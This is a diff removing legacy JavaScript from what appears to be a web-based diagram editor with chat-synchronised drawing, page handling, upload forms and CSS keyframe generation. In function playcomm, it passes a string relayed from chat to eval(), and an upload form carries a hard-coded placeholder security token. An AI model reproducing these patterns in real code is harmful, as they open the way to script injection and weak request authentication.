-        }
- 
-        document.write("<td   id=tdline align=left  valign=middle  style=\"text-decoration:underline;background-color:transparent;font-size:16px;font-family:courier;font-weight:500;border-radius:0px;color:" + colors[menufontcolor] + "\" valign=middle onclick=\"select(this,0,0);hidehint()\"  title=\"" + hintstr[9] + "\" >" + textmsg[1850].split(/@/)[4] + "</td>");
-         if ( chatsessionnum==-1 )document.write("<td    id=tdcurve align=left valign=middle  style=\"text-decoration:underline;font-size:16px;font-weight:500;background-color:transparent;border-radius:0px;color:" + colors[menufontcolor] + "\"  onclick=\"selcurve();hidehint()\" title=\"" + hintstr[10] + "\"  onmouseout=hidehint()>" + textmsg[1850].split(/@/)[5] + "</td>");
-        document.write("<td  id=tdbg align=left valign=middle  style=\"text-decoration:underline;font-size:15px;background-color:transparent;font-weight:500;border-radius:0px;color:" + colors[menufontcolor] + "\" onclick=\"startbg(this);hidehint()\" title=\"" + hintstr[11] + "\"  onmouseout=hidehint() ><nobr>" + textmsg[1781].replace(/,.*/,'') + "</nobr></td>");
-
-         if ( chatsessionnum==-1 )document.write("<td   id=tdcf align=left valign=middle  style=\"text-decoration:underline;font-size:15px;background-color:#transparent;font-weight:500;border-radius:0px;color:" + colors[menufontcolor] + "\" onclick=\"mdia(1,5);hidehint()\"  title=\"" + hintstr[12] + "\"  onmouseout=hidehint()><nobr>" + textmsg[1786].replace(/@.*/,'') + "</nobr></td>");
-        document.write("<td    id=tdcord  style=\"text-decoration:underline;background-color:transparent;font-size:15px;vertical-align:middle;font-weight:500;border-radius:0px;color:" + colors[menufontcolor] + "\" valign=middle align=left onclick=movecord()></td>");
-        if (document.createElement('input').webkitSpeech !== undefined)
-        document.write("<td     valign=middle align=left><input id=voice style=\"text-decoration:underline;font-size:14px;vertical-align:middle;border:1px #555555 solid;width:20px;border-radius:0px;color:" + colors[menufontcolor] + "\" onfocus=voicefocus(this) onblur=voiceblur(this) x-webkit-speech></td>");
-        if ( chatsessionnum==-1 )
-        {
-            document.write("<td width=0><form name=ff1 style=\"margin:0px 0px 0px 0px\" method=post  enctype=\"multipart/form-data\" action=UploadFile" +
-                    " target=\"" + iframename + "\"><input type=file size=1 style=\"width:1px;visibility:hidden\" name=localpath onchange=\"clickedhere(this);upload(document.ff1)\" " +
-                    "><input type=hidden name=maximumsize value=10000000><input type=hidden name=dummy value=4000000>" +
-                    "<input type=hidden name=securitytoken value=\"111111111\">" +
-                    "<input type=hidden   name=allcourse value=\"\"><input type=hidden name=subdb value=\"" + subdb + "\"><input type=hidden name=subfolder value=\"chat\"><input type=hidden name=saveindir value=\"" + folder + "\"></form>" +
-                    "</td>");
-        }
-        document.write("<td width=0><form style=\"margin:0px 0px 0px 0px\" name=\"f\" method=\"post\" action=\"FileOperation\" >"
-                        + "<input name=operation type=hidden value=save>"
-                        + "<input name=filedir size=8 style=\"border:0px;background-color:transparent;\"  type=hidden  value=\"" + filename + "\"  >"
-                        + "<input name=folder  type=hidden  >"
-                        + "<input name=destination type=hidden ><td><input name=attach type=hidden></td></form></td>");
-           
-        document.write("</tr></table>");
- 
-    }
-    cord = $("tdcord");
-    onmouseover0 = (navigator.userAgent.indexOf('MSIE') > - 1)?
-    function ()
-    {
-        myHintx = event.clientX + document.body.scrollLeft;
-        myHinty = event.clientY + document.body.scrollTop;
-        //var ps = $('selplay');
-        if (drawstate == 2)
-        {
-            addp();
-        }
-        else if (state == 1 || state == 2)
-        {
-
-        }
-        else 
-        {
-            if (cord!=null && (Play.handle == null ||Play.current == 'resume'))
-            {
-                cord.innerHTML = myHintx + "," + myHinty;
-            }
-             
-        }
-    }
-    : function (e)
-    {
-        myHintx = e.pageX;
-        myHinty = e.pageY;
-        if (drawstate == 2)
-        {
-        addp();
-        }
-        else if (state == 1 || state == 2)
-        {
-
-        }
-        else
-        {  
-            if (cord!=null && (Play.handle == null ||Play.current == 'resume'))
-            {
-                cord.innerHTML = myHintx + "," + myHinty;
-            }
-             
-        }
-    }
-    document.onmousemove = onmouseover0;
-    if (typeof(document.f)!='undefined' && typeof(document.f.attach)!='undefined')
-    ResizeUploaded.attachref = document.f.attach;
-   
-}
-function $(id) {return document.getElementById(id);}
-function playcomm(str)
-{
-    if (str == playcommand) return;
-    var j = str.indexOf(';');
-    var x = str.substring(0,j);
-    var p = (new CSVParse(str.substring(j+1),"\"",",", ";")).nextMatrix();
-    for (var i=0; i < p.length; i++)
-    {
-        var k = parseInt(p[i][0]);
-        allShapes[k].start = parseInt(p[i][1]);
-        allShapes[k].time  = parseInt(p[i][2]);
-
-    }
-    eval(x);
-}
-var playcommand;
-function sendObject(num,del)
-{
-    if (chatsessionnum > -1 && num ==-2)
-    {
-        var x = '';
-        for (var i=0; i < numShapes; i++)
-        {
-            if (allShapes[i] != null)
-            {
-                x += ';' + i + ',' + allShapes[i].start + ',' + allShapes[i].time  ;
-            }
-        }
-        playcommand = del + x;
-        parent.sendObject(chatsessionnum,  playcommand);
-    }
-    else if (chatsessionnum > -1 && num != null &&  num >=0 && allShapes[num]!= null && (  del !=null))
-    {
-        if (del == null)
-        {
-            var tt = num + " s" + allShapes[num].toString();
-            parent.sendObject(chatsessionnum,  tt);
-        }
-        else if (del== 'd')
-        {
-            parent.sendObject(chatsessionnum,  num + " s"  );
-        }
-        else if (del== 'u')
-        {
-            parent.sendObject(chatsessionnum, ""+ num   );
-        }
-
-        else if (del== 'a')
-        {
-            parent.sendObject(chatsessionnum, ""+ num  + "a"  );
-        }
-        else if (del== 'h')
-        {
-            parent.sendObject(chatsessionnum, ""+ num  + "h"  );
-        }
-
-    }
-}
-
-
-
-function uploadfile()
-{
-    saveit();
-    formnewaction(document.ff1, originalurl + "/UploadFile");
-    document.ff1.localpath.click();
-
-}
-function startbg(td)
-{
-    if (numsselected!=null)
-    canceldia(numsselected[numsselected.length-1],cdbeing);
-    dobackground=!dobackground;
-    if (dobackground)
-         enabletd('tdcord');
-    else
-         enabletd(null,1);
-    
-    var xs = textmsg[1781].split(/,/);
-    td.innerHTML = '<nobr>' +  ((dobackground)?xs[1]:xs[0]) + '</nobr>';
-    if (dobackground)
-    {
-        mdia(0,0);
-    }
-    else
-    {
-        drawstate = 0;
-        drawlinenumber = null;
-        linetype = '';
-
-        document.onclick = null;
-
-    }
-
-}
-function voicefocus(t){t.style.width='200px';}
-function voiceblur(t){t.style.width='20px';}
-function addp()
-{
-    var x = $("c" + drawlinenumber + "_" + (allCurves[drawlinenumber].k-1));
-    if (x==null) return;
-    if (drawpointslength > 1 &&  myHintx== drawpoints[drawpointslength-1][0] && myHintx== drawpoints[drawpointslength-2][0] && myHinty != drawpoints[drawpointslength-1][1])
-    {
-        x.style.height = Math.abs(myHinty - drawpoints[drawpointslength-2][1]) + 'px';
-        drawpoints[drawpointslength-1][1] = myHinty;
-    }
-    else if (drawpointslength > 1 &&  myHinty== drawpoints[drawpointslength-1][1] && myHinty== drawpoints[drawpointslength-2][1] && myHintx != drawpoints[drawpointslength-1][0])
-    {
-        x.style.width = Math.abs(myHintx - drawpoints[drawpointslength-2][0]) + 'px';
-        drawpoints[drawpointslength-1][0] = myHintx;
-    }
-    else if (myHintx != drawpoints[drawpointslength-1][0] || myHinty != drawpoints[drawpointslength-1][1])
-    {
-        drawpoints[drawpointslength] = [myHintx, myHinty];
-        if (drawpointslength>0)
-        allCurves[drawlinenumber].draw(drawpointslength-1);
-        drawpointslength++;
-
-    }
-}
- 
-function makeanew(td)
-{
-   stopdemo();
-   newshape(td);
-}
-function newshape(td,n)
-{
-    if (chatsessionnum > -1 && td != null)
-    {
-        
-        parent.sendObject(chatsessionnum,'s');
-        return;
-    }
-    if (td == null)
-    {
-        if ( cachedshapename != null)
-        {
-            anewshape(allShapes.length,cachedshapename);
-            return;
-        }
-
-        if (chatsessionnum > -1  && hassaved== false && $("m0_0" )!=null && cutshape != '')
-        {
-            pasteshape(n);
-            return;
-        }
-    }
-    
-    var i = 0;//parseInt(td.name.replace(/[a-z]/g,''));
-    hassaved = false;
-    var x = 10;
-    var y = 200;
-
-    if (numediting >-1)
-    {
-       x = allShapes[numediting].x +110;
-       y = allShapes[numediting].y;
-    }
-
-    var xy = [0, 5];
-    if (typeof(findPositionnoScrolling)!='undefined')
-        xy = findPositionnoScrolling($("toolbar"));
-    if (y < xy[1]) y = xy[1]+40;
-    document.onmousemove = onmouseover0;
-    if (n==null) n = allShapes.length;
-  
-    var z  = new Shape(n,'','', cachedshapename, x, y, 400, 150, parseInt(cachedfontsize.replace(/px/i,'')), cachedcolor,cachedbgcolor,cachedfc,0,n,n);
-    z.visible = 1;
-    allShapes[n] = z;
-    if (numediting==-1)
-    {
-         
-         action(z.base, n);
-         
-    }
-    else
-    {
-        z.initbase();
-        z.init();
-    }
-}
-var drawlinetypei,drawlinenumber = null;
-
-function enabletd(str,b)
-{
-   if (str!=null)
-   str  = "," + str + ",";
-   var tds = ['tdfile','tdplay','tdpage','tdclip', 'tdline','tdcurve','tdbg','tdcf','tdcord', 'tdicon' ];
-   for (var i=0; i < tds.length; i++)
-   {
-       var x = $(tds[i]);
-       if (x == null){  continue}
-
-       if (str!=null && str.indexOf(tds[i]) >= 0 && b == null || str == null && b!=null)
-       {
-           x.style.visibility = 'visible';
-           if (tds[i] == 'tdpage'|| tds[i] == 'tdplay')
-               $(tds[i].replace(/td/,'sel')).style.visibility = 'visible';
-       }
-       else
-       {
-           x.style.visibility = 'hidden';
-           if (tds[i] == 'tdpage'|| tds[i] == 'tdplay')
-               $(tds[i].replace(/td/,'sel')).style.visibility = 'hidden';
-       }
-   }
-}
-function drawdone(dot)
-{
-   if ( chatsessionnum > -1 )
-   {
-       parent.sendObject(chatsessionnum, drawlinenumber + " c" +  allCurves[drawlinenumber].toString());
-   }
-   drawstate = 0;
-   drawlinenumber = null;
-   linetype = '';
-   document.body.removeChild(dot);
-   linetype='mline';
-   drawstate = -1;
-   drawlinetypei = 0;
-   if (drawlinenumber == null)
-   {
-       drawlinenumber = numCurves;
-   }
-  
-   hassaved = false;
-}
-var firstcurvenum = 0;
-function selcurve()
-{
-    var td = $('tdcurve');
-    var cword = textmsg[1781].replace(/.*,/,'');
-    if (td.innerHTML  == cword)
-    {        
-       if ( chatsessionnum > -1 )
-       {
-           parent.sendObject(chatsessionnum, drawlinenumber + " c" +  allCurves[drawlinenumber].toString());
-       }
-       drawstate = 0;
-       drawlinenumber = null;
-       linetype = '';
-       document.onclick =null;
-       enabletd(null,1);
-       var t=$('drawdonebtn');
-       if (t!=null) 
-       document.body.removeChild(t);
-        td.innerHTML = textmsg[1850].split(/@/)[5] ;
-        td.style.fontSize = '16px';
-        td.style.backgroundColor='transparent';
-        drawstate = 0;
-        drawlinenumber = null;
-        linetype = '';
-        document.onclick =null;
-        enabletd(null,1);
-         $('selplay').style.visibility = 'hidden';
-         $('selpage').style.visibility = 'hidden';
-        if (firstcurvenum < numCurves)
-        {
-        numsselected = [];
-        for(; firstcurvenum < numCurves-1; firstcurvenum++)
-           numsselected[numsselected.length] = firstcurvenum;
-        mdia(numCurves-1,4);
-        }
-        
-    }
-    else
-    {
-        document.onclick = winclick;
-        firstcurvenum = numCurves;
-        //td.style.backgroundColor='#bbb';
-        td.style.fontSize = '15px';
-        td.innerHTML = cword;
-        enabletd(td.id+',tdcord');
-        myprompt(textmsg[1783]);
-        promptwin.style.top = '0px';
-        setTimeout(closeprompt1, 2000);
-        drawlinetypei = 0;
-        if (chatsessionnum > -1)
-        {
-            parent.sendObject(chatsessionnum,'c');
-            return;
-        }
-        linetype='mline';
-        drawstate = 3;
-        if (drawlinenumber == null)
-        {
-            drawlinenumber = numCurves;
-        }
-        hassaved = false;
-    }
-}
-
-function drawmode()
-{
-
-}
-function select(td,i,j)
-{
-     
-    if (state>0)
-    {
-        state = 0;
-        enabletd(null,1);
-        var x = $("q" + savestart);
-        if (x!=null)
-        {
-            if (savestart==-1)
-                document.body.removeChild(x);
-            else
-                allShapes[savestart].base.removeChild(x);
-        }
-        linetype = '';
-
-        if (numsselected!=null && numsselected.length>=1)
-            mdia(numsselected[numsselected.length-1],2);
-        drawlinenumber = null;
-        td.style.fontWeight='400';
-        
-        td.innerHTML = textmsg[1850].split(/@/)[4] ;
-        td.style.fontSize = '16px';
-         $('selplay').style.visibility = 'hidden';
-         $('selpage').style.visibility = 'hidden';
-         if(editable)$('selfile').style.visibility = 'hidden';
-        document.onclick = null;
-        return;
-    }
-    document.onclick = winclick;
-    td.style.fontSize = '15px'
-   // td.style.backgroundColor='#ccc';
-    td.innerHTML = '<nobr>' + textmsg[1781].replace(/.*,/,'') +  '</nobr>';
-    myprompt(textmsg[1782]);
-    promptwin.style.top = '0px';
-
-    setTimeout(closeprompt1,2000);
-    enabletd( 'tdline,tdcord');
-
-    drawlinetypei = i;
-    seldirect = j;
-    if (chatsessionnum > -1)
-    {
-        parent.sendObject(chatsessionnum,'l');
-        return;
-    }
-    hassaved = false;
-    linetype = arrows[i];
-    state = 1;
-    hidehint();
-}
-function parsestr(s)
-{
-
-    if (s == null) return false;
-    var  st = 0;
-    var  j=0;
-    s = s.replace(/\r/g, '');
-    while(j < s.length && (s.charAt(j)==' ' || s.charAt(j)=='\n' || s.charAt(j)== "\r") )
-       j++;
-
-    var z = "";
-    tempsstr = new Array();
-    templstr = new Array();
-    tempcstr = new Array();
-    tempastr = new Array();
-    tempbstr = null;
-    var isShape = true;
-    for (var i=0; i < s.length; i++)
-    {
-        if (s.charAt(i)== "'" && (i==0 || s.charAt(i-1)!='\\'))
-           st = 1 - st;
-
-        if (st== 0)
-        {
-           if (i > 10 && (s.charCodeAt(i)== 10 || s.charAt(i)== '\r' || s.charAt(i)== '\n' || i== s.length-1))
-           {
-            var k = i;
-            if (i== s.length-1)
-                k = s.length;
-
-            while ( k>=1 &&  s.charAt(k-1)== ' ' )
-            {
-                k--;
-            }
-            var one = s.substring(j,k);
-
-            if (one.length > 2 &&  isShape && one.charAt(0)== "'" )
-            {
-                tempsstr[tempsstr.length] = one;
-            }
-            else if ( isShape==false && one.length > 10 && one.charAt(0)== "'"  )
-            {
-                templstr[templstr.length] = one;
-            }
-            else if (one.length <= 2)
-            {
-                 isShape = false;
-            }
-            j = i+1;
-            while(j < s.length && (s.charAt(j)==' ' || s.charAt(j)=='\n' || s.charAt(j)== "\r"))
-            {
-                j++;
-
-            }
-            if (j== s.length)
-            {
-                break;
-            }
-            z = '';
-           }
-           else if (s.charAt(i)!="'") z +=  s.charAt(i);
-        }
-        else z = '';
-    }
-     return tempsstr.length >0 || templstr.length > 0;
-}
-function cachedone(needconfirm)
-{
-    var str = GetCookie("UMLtoolstr");
-
-    if (str == null) return false;
-    var stmpi = str.indexOf(" ");
-    if (stmpi < 0) return false;
-    var dstr = str.substring(0, stmpi);
-    if (isNaN(dstr)) return false;
-    var d = parseInt(dstr);
-    var j = str.indexOf(" ",1+stmpi);
-    if (j < 0) return false;
-    var fnstr = str.substring(stmpi+1, j);
-    if (fnstr!=filename) return false;
-    var pn = str.indexOf(" ",1+j);
-    if (pn < 0) return false;
-    var pstr = str.substring(j+1, pn);
-    if (isNaN(pstr)) return false;
-    pgn = parseInt(pstr);
-    if (pgn > shapearr.length) return false;
-    str = str.substring(pn+1);
-    var bb = parsestr(str);
-
-    if (bb== false)
-    {
-         return false;
-    }
-    if (shapearr.length== 0)
-    {
-        usecached();
-    }
-    else if (needconfirm== true && typeof(tstmp) != 'undefined')
-    {
-        var tnow = (new Date()).getTime();
-        tnow = tnow - (tnow%10000000) + tstmp;
-        var savedtime = (new Date(tnow)).toString();
-        var cachedtime = (new Date(d)).toString();
-        var compare = " > ";
-        if (d < tnow ) compare =  ' < ';
-        myprompt(textmsg[1652].replace(/#/, (pgn+1)).replace(/#/, cachedtime ).replace(/#/,  compare)
-            .replace(/#/, savedtime ).replace(/#/, (pgn +1) ),
-            null,
-            "if(v)usecached()",textmsg[1633]);
-
-    }
-     return true;
-}
-function notcached(clearfirst)
-{
-    if (clearfirst) delall();
-    if (pagenum < shapearr.length)
-    {
-       initial();
-    }
-}
-function copy(a, num, b)
-{
-    if (b==null || b.length==0) return;
-    if (num >=0 && b.length>0)
-    {
-       a[num] = new Array();
-       for (var i=0; i < b.length; i++)
-       {
-           a[num][i] = b[i];
-       }
-    }
-    else if (b.length>0)
-    {
-        a = new Array(b.length);
-        for (  i=0; i < b.length; i++)
-         {a[i] = b[i];}
-    }
-}
-function usecached()
-{
-    if (psel!= null && pgn >= pagetbl.rows.length-1)
-        return;
-    if (pgn!=pagenum) makeintostring();
-    delall();
-    pagenum = pgn;
-
-    copy(shapearr,pgn , tempsstr);
-    copy(linearr, pgn, templstr);
-    copy(curvearr, pgn, tempcstr);
-    copy(allies, pgn, tempastr);
-    tempbstr = bgarr[pgn];
-    initial();
-
-}
-function movecord()
-{
-
-    mdia(0,3);
-    document.onmousemove = onmouseover0;
-}
-function genkeyframes(num)
-{
-    var str = genkeyframe(num,'e') + genkeyframe(num,'s') + genkeyframe(num,'l');
- 
-    var std = $('kf' + num);
-    if (std == null)
-    {
-        if (str!=''){
-        std = document.createElement('style');
-        std.id = 'kf' + num;
-        std.innerHTML = str;
-        document.getElementsByTagName('head')[0].appendChild(std);}
-    }
-    else
-    {
-        if (str!='')
-          std.innerHTML = str;
-        else 
-          document.getElementsByTagName('head')[0].removeChild(std);  
-    }
-}
-function genkeyframe(num, type)
-{
-    var str = '';
-    var kframe = kframes[pagenum + '_' + num];
-    if (kframe == null)
-        return '';
-    var tm = kframe.etm;
-    if (type == 's')
-        tm = kframe.stm;
-    else if (type == 'l')
-        tm = kframe.ltm;
-    if (tm == 0)
-        return '';
-    var sn = kframe.esn;
-    if (type == 's')
-        sn = kframe.ssn;
-    else if (type == 'l')
-        sn = kframe.lsn;
-    var ts = kframe.ets;
-    if (type == 's')
-        ts = kframe.sts;
-    else if (type == 'l')
-        ts = kframe.lts;
-    if (type == 'e')
-    {
-        if (sn >= 0)
-        {
-            var kshape = kshapes[sn];
-            var k = new Shape(sn);
-            k.parse(kshape);
-            if (ts != null && ts.length > 0)
-            {
-                k.x = ts[0][0];
-                k.y = ts[0][1];
-            }
-            str += "@keyframes b" + type + "_" + num + "{\n";
-            var xx = k.keyframe("0");
-            xx += 'opacity:0.0';
-            str += xx + "}\n";
-
-            if (ts != null && ts.length > 1)
-            {
-                var len = 100 / ts.length;
-                for (var jj = 1; jj < ts.length; jj++)
-                {
-                    str += Math.round(jj * len) + "%{";
-                    str += "left:" + ts[jj ][0] + "px;top:" + ts[jj ][1] + "px;}\n";
-                }
-            }
-            xx = allShapes[num].keyframe(100);
-
-            str += xx + "opacity:1.0;}\n}\n";
-        } else if (ts != null && ts.length > 0)
-        {
-            str += "@keyframes b" + type + "_" + num + "{\n";
-            var len = (100 / ts.length);
-            for (var jj = 0; jj < ts.length; jj++)
-            {
-                str += Math.round(jj * len) + "%{";
-                str += "left:" + ts[jj][0] + "px;top:" + ts[jj][1] + "px;}\n";
-            }
-            xx = allShapes[num].keyframe(100);
-            xx += "opacity:1.0;"
-            str += xx + "\n}\n}\n";
-        }
-    } else if (type == 's')
-    {
-        str += "@keyframes b" + type + "_" + num + "{\n";
-        var xx = allShapes[num].keyframe("0");
-        xx += "opacity:1.0}";
-        str += xx;
-
-        if (ts != null && ts.length > 0)
-        {
-            var len = 100 / ts.length;
-            for (var jj = 1; jj < ts.length; jj++)
-            {
-                if (sn != -1 && jj == ts.length - 1)
-                    break;
-                str += Math.round(jj * len) + "%{";
-                str += "left:" + ts[jj ][0] + "px;top:" + ts[jj ][1] + "px;}\n";
-
-            }
-        }
-        if (sn > 0)
-        {
-            var kshape = kshapes[sn];
-            var k = new Shape(sn);
-            k.parse(kshape);
-            if (ts != null && ts.length > 0)
-            {
-                k.x = ts[ts.length - 1][0];
-                k.y = ts[ts.length - 1][1];
-            }
-            var xx = k.keyframe(100);
-            xx += 'opacity:1.0}';
-        }
-        str += xx + "\n}\n";
-    } else
-    {
-        str += "@keyframes b" + type + "_" + num + "{\n";
-        var xx = allShapes[num].keyframe("0");
-        xx += "opacity:1.0}";
-        str += xx;
-        if (ts != null && ts.length > 0)
-        {
-            var len = 100 / ts.length;
-            for (var jj = 0; jj < ts.length; jj++)
-            {
-                if (sn != -1 && jj == ts.length - 1)
-                    break;
-                str += Math.round(jj * len) + "%{";
-                str += "left:" + ts[jj ][0] + "px;top:" + ts[jj ][1] + "px;}\n";
-            }
-        }
-
-        if (sn >= 0)
-        {
-            var kshape = kshapes[sn];
-            var k = new Shape(sn);
-            k.parse(kshape);
-
-            if (ts != null && ts.length > 0)
-            {
-                k.x = ts[ts.length - 1][0];
-                k.y = ts[v - 1][1];
-            }
-
-            var xx = k.keyframe("100");
-            xx += "opacity:0.0";
-            str += xx + "}\n";
-        }
-        str += "\n}\n";
-    }
-    return str;
-}
-
-HandleAttach.attaf2code = new Array();
-function HandleAttach(atta)
-{
-    this.divs = "";
-    this.maximagelet = 0;
-    this.attachheader = '';
-    this.numlets = 0;
-    this.goodopenurl = function(codepath,tail)
-    {
-        if (codepath.indexOf('http://') == 0 || codepath.indexOf('https://') == 0)
-        {
-            return codepath;
-        }
-        else
-        {
-            var st= "FileOperation?did=" + codepath;
-            if (tail==null||tail==true) st = "&tcode=" + (new Date()).getTime()%1000000000;
-            return st;
-        }
-    }
-
-    this.parseAttach = function(atta)
-    {
-        if (atta == null)
-        {
-            this.divs = "";
-            this.maximagelet = 0;
-            this.attachheader = '';
-            this.numlets = 0;
-            return;
-        }
-        this.numlets = 0;
-        atta = ResizeUploaded.unzip(atta);
-        atta = atta.replace(/,$/,'');
-        if (atta == '')
-        {
-            this.divs = "";
-            this.maximagelet = 0;
-            this.attachheader = '';
-            var sid = $('style_0' );
-            if (sid!=null) document.getElementsByTagName('head')[0].removeChild(sid);
-            return;
-        }
-        var z = (new CSVParse(atta, '\'','@',',')).nextMatrix(true);
-        var at = '', q='';
-        var k=0;
-        var iis = '';
-
-        for (var i=0; i < z.length; i++)
-        {
-            if (  this.courseonly!=null && z[i][2].charAt(0) == '_') continue;
-            if ( z[i][0].replace(/[0-9]/g,"")==""  && z[i][2].replace(/[0-9]+/g, "")=="___")
-            {
-                this.numlets++;
-                var xx = HandleAttach.attaf2code[z[i][1]];
-                
-                if (xx == null) continue;
-                
-                if (parseInt(z[i][0]) > this.maximagelet)
-                {
-                    this.maximagelet = parseInt(z[i][0]);
-                }
-                var  ns = z[i][2].split(/_/);
-                var cln = 'imagelet'+z[i][0];
-                var bs = base2cn[cln];
-
-                if (bs!=null)
-                   bs.base.style.cssText = setBorder(bs.base.style.cssText,[(parseInt(ns[0])), (parseInt(ns[1])),(parseInt(ns[2])), (parseInt(ns[3]))],bs.shape);
-                imagelet2wh[cln] =  [(parseInt(ns[0])), (parseInt(ns[1])),(parseInt(ns[2])), (parseInt(ns[3]))];
-                q += "div." +  cln
-                + "\n{\nmargin:0px;background-image:url("
-                + this.goodopenurl(xx,false) + ");\nbackground-position:-" + ns[0] + "px -" + ns[1] + "px;\nwidth:" + ns[2] + "px  ;\nheight:" + ns[3] + "px  ;\n}\n\n";
-                q += ".shapebg" +z[i][0]
-                + "\n{\nmargin:0px;background-image:url("
-                + this.goodopenurl(xx,false) + ");\nbackground-position:-" + ns[0] + "px -" + ns[1] + "px;\n}\n";
-                k = at.indexOf('>' + z[i][1] + '<');
-                if (k >=0)
-                {
-                    at = at.substring(0,k).replace(/ <[^<]+$/,'') + at.substring(k+z[i][1].length+8);
-                }
-            }
-            else
-            {
-                var cd = HandleAttach.attaf2code[z[i][0]];
-                if (cd == null)
-                {
-                   if (z[i].length == 3)
-                   {
-                       HandleAttach.attaf2code[z[i][0]] = z[i][2];
-                       at += " <span style=color:blue;cursor:pointer onclick=\"openproper('" + z[i][2] + "','" + z[i][0] + "',this)\" >" + z[i][0] + "</span> ";
-                   }
-                   else
-                   {
-                       HandleAttach.attaf2code[z[i][0]] = z[i][1];
-                       at += " <span style=color:blue;cursor:pointer onclick=\"openproper('" + z[i][1] + "','" + z[i][0] + "',this)\" >" + z[i][0] + "</span> ";
-                   }
-                }
-            }
-        }
-        this.divs = q  ;
-
-        at = at.replace(/^[ ]+/g, '').replace(/[ ]+$/g, '');
-        if (at.length > 1)
-        {
-            this.attachheader = at;
-        }
-        addcss2head(0, this.divs, '');
-    }
-
-    this.merge = function(s)
-    {
-        var iis = "_" + pagenum;
-        if (s==null) return '';
-        if (ismakingtab != 1) return s;
-          return s.replace(new RegExp("\\[" + textmsg[1303],"ig"),"[imagelet").replace(new RegExp("\\[imagelet([0-9]+):1\\]","ig"),"<table style=display:inline;float:left cellpadding=0 cellspacing=0 ><tr><td><div  class=\"imagelet$1"   + "\"></div></td></tr></table>")
-          .replace(new RegExp("\\[imagelet([0-9]+):2\\]","ig"),"<table style=display:inline;float:right  cellpadding=0 cellspacing=0 ><tr><td><div class=\"imagelet$1"  + "\"></div></td></tr></table>")
-          .replace(new RegExp("\\[imagelet([0-9]+)\\]", "ig"), "<table align=center  cellpadding=0 cellspacing=0 ><tr><td><div class=\"imagelet$1" +  "\"></div></td></tr></table>");
-    }
-
-}
-var hw = new HandleAttach();
-function setBorder(s, arr, shape)
-{
-    var j, k;
-    j = s.indexOf("width:");
-    if (j==-1)
-        s += ";width:" + arr[2] + 'px';
-    else
-    {
-        k = s.indexOf('px',j);
-        s = s.substring(0,j) + ";width:" + arr[2] + s.substring(k);
-    }
-    j = s.indexOf("height:");
-    if (j==-1)
-        s += ";height:" + arr[2] + 'px';
-    else
-    {
-        k = s.indexOf('px',j);
-        s = s.substring(0,j) + ";height:" + arr[2] + s.substring(k);
-    }
-    if (shape=='rightrect')
-        var da = '0px';
-    else if (shape=='roundrect')
-        da =  (2*arr[2]/100) + 'px';
-    else  if (shape=='circle')
-        da =  (arr[2]/2) + 'px';
-    else  if (shape=='ellipse')
-        da =   '50% / 50%';
-    else  if (shape=='egg')
-        da =   '50% 50% 50% 50% / 40% 40% 60% 60%';
-    j = s.indexOf("border-radius:"); if (j==-1)
-        s += ";border-radius:" + da;
-    else
-    {
-        k = s.indexOf(';',j);
-        if (k>0)
-        s = s.substring(0,j) + ";border-radius:" + da + s.substring(k);
-        else
-           s = s.substring(0,j) + ";border-radius:" + da + ";"
-    }
-
-    return s;
-}
-
-function changepage(sel)
-{
-   var keepdo = true;
-   for (var jj=0; keepdo && jj < numShapes ; jj++)
-       if ( $("m" + jj + "_" + cdbeing) !=null )
-            {
-                canceldia(jj,cdbeing);
-                keepdo = false;
-            }
-   var v = $("m0_0");
-   if (v!=null) document.body.removeChild(v);
-   hassaved = false;
-   var pn = -1;
-   var xx = sel.innerHTML.replace(/[^0-9]/g,'');
-   if (xx!='' && isNaN(xx) == false)
-       pn = parseInt(xx)-1;
-   if (pn == pagenum && ismakingtab == 1) return;
-  // if (pagenum>=0)  pagetbl.rows[pagenum].cells[0].style.backgroundColor = 'white';
-   var tpb = '';
-   if (typeof(bgarr)!= 'undefined' && pagenum>=0)
-       tpb = bgarr[pagenum];
-   if (pagenum != pn)
-   {
-      Play.stopfordel();
-   }
-
-   if (ismakingtab == 1 && haspagesort==false)
-   {
-       makeintostring();
-   }
-   
-   delall();
-   //attachstr  = document.f.attach.value;
-   var sid = $('style1_' );
-  // if (sid!=null) document.getElementsByTagName('head')[0].removeChild(sid);
-   if (pn== -1)
-   {
-       pagenum = parseInt(pagetbl.rows[pagetbl.rows.length-2].cells[0].innerHTML.replace(/[^0-9]/g,''));
-       var r = pagetbl.insertRow(pagetbl.rows.length-1);
-       var c = r.insertCell(-1);
-       c.innerHTML =   textmsg[1854].replace(/@/,''+ (pagenum+1));
-       c.onclick = function(){changepage(this);}
-       c.style.fontWeight = '400';
-       c.style.backgroundColor = 'transparent';
-    
-   }
-   else
-   {
-       pagenum = pn;
-       initial();
-       if (ismakingtab == 1 && typeof(LaTexHTML) != 'undefined')
-       {
-            for (var  k=0; k < numShapes; k++)
-            {
-                if (allShapes[k]!=null)
-                {
-                    LaTexHTML.formatele(allShapes[k].base);
-                }
-            }
-       }
-   }
-  // pagetbl.rows[pagenum].cells[0].style.backgroundColor = 'grey';
-   $('tdpage').innerHTML = textmsg[1854].replace(/@/,''+ (pagenum+1));
-   //document.f.attach.value = attachstr==null?'':attachstr;
-   if (typeof(bgarr) != 'undefined')
-   {
-       if (bgarr[pagenum] == null)
-       {
-           if (tpb == null) tpb = '';
-           bgarr[pagenum] = tpb;
-       }
-       setdocbg(bgarr[pagenum]);
-   }
-   allowmove(1);
-   setTimeout(fixall,100);
-}
-
-function clearall(d)
-{
-
-    if (ismakingtab == 1 && chatsessionnum== -1 )
-    {
-         makeintostring();
-         copy(tempsstr,-1,shapearr[pagenum]);
-         copy(templstr,-1,linearr[pagenum]);
-         copy(tempcstr,-1,curvearr[pagenum]);
-         copy(tempastr,-1,allies[pagenum]);
-         bgarr[pagenum] = tempbstr;
-    }
-    for (var i=0; i < numShapes; i++)
-    {
-        if (allShapes[i]!=null && allShapes[i].inediting)
-            return;
-    }
-
-    
-    for (i=0; i < numLines; i++)
-    {
-        if (allLines[i]!=null)
-        {
-            allLines[i].delme();
-            allLines[i] = null;
-        }
-    }
-    for (i=0; i < numCurves; i++)
-    {
-        if (allCurves[i]!=null)
-        {
-            allCurves[i].delme();
-            allCurves[i] = null;
-        }
-    }
-    for (i= allShapes.length-1; i>=0; i--)
-    {
-        if (allShapes[i]!=null)
-        {
-            allShapes[i].delme();
-        }
-    }
-
-    numShapes = numLines =  numCurves = 0;
-    if (chatsessionnum > -1 && d == null)
-    {
-        parent.sendObject(chatsessionnum,'d');
-    }
-
-}
-function clearall1(btn)
-{
-   var psel = $("selpage");
-   if (btn != null)
-   {
-       var str = "";
-       if (chatsessionnum== -1)
